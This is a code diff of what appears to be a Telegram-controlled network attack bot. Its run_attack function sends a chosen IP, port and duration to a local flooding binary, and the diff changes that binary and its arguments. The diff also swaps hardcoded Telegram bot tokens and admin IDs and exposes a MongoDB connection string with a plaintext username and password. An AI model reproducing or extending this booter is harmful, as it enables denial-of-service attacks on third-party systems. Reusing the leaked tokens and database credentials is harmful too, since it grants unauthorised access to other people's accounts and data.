@@ -9,8 +9,8 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7431527955:AAHUweIiRF2CaEVOFyICMttQyysTWc5xcz0'  # Replace with your bot token
-ADMIN_USER_ID = 5759284972
+TELEGRAM_BOT_TOKEN = '7713842378:AAFCBpFw9ECVuWUf7KJDHL_lfbO7dN7bGZ0'  # Replace with your bot token
+ADMIN_USER_ID = 5477802914
 MONGO_URI = "mongodb+srv://rmr31098:ranbal123@cluster0.pcbr2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 DB_NAME = "rmr31098"
 COLLECTION_NAME = "users"
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./WHO {ip} {port} {duration} {6} {900}"
+        command = f"./known {ip} {port} {duration} {7} {900}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
